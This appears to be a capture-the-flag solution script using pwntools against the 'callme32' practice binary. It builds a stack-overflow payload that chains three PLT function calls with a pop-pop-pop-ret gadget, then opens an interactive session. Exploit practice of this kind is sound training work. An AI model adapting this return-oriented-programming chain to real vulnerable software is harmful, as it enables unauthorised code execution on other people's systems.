#!/usr/bin/python 
from pwn import *

p = process("./callme32")
elf = ELF("./callme32")
p3ret = 0x80488a9

pay = 'A'*(0x28+0x4)
pay += p32(elf.plt['callme_one']) + p32(p3ret) + p32(1) + p32(2) + p32(3) 
pay += p32(elf.plt['callme_two']) + p32(p3ret) + p32(1) + p32(2) + p32(3)
pay += p32(elf.plt['callme_three']) + p32(p3ret) + p32(1) + p32(2) + p32(3)

p.sendlineafter("> ", pay)

p.interactive()
